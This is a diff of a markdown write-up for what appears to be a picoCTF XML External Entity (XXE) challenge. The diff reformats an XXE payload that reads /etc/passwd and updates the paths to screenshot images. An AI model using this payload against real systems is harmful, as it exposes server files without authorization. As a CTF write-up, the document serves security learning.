@@ -29,26 +29,21 @@
 * Modified XML request:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE data [
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">
+	]>
 
-<!DOCTYPE data [
-
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-
-]>
-
-<data>
-
-<ID>&xxe;</ID>
-
-</data>
+	<data>
+		<ID>&xxe;</ID>
+	</data>
 ```
 * tests
-![Test1](/Medium/PicoCtf-XXE/test(1).png)
-![Test2](/Medium/PicoCtf-XXE/tests(2).png)
-![Test3](/Medium/PicoCtf-XXE/tests(3).png)
+![Test1](/Medium/PicoCtf-XXE/images/test(1).png)
+![Test2](/Medium/PicoCtf-XXE/images/tests(2).png)
+![Test3](/Medium/PicoCtf-XXE/images/tests(3).png)
 
 - Proof of completed CTF
-![Proof completed CTF](/Medium/PicoCtf-XXE/Proof.png)
+![Proof completed CTF](/Medium/PicoCtf-XXE/images/Proof.png)
 
 ### 5. Impact Analysis
 - What could an attacker do with this vulnerability?
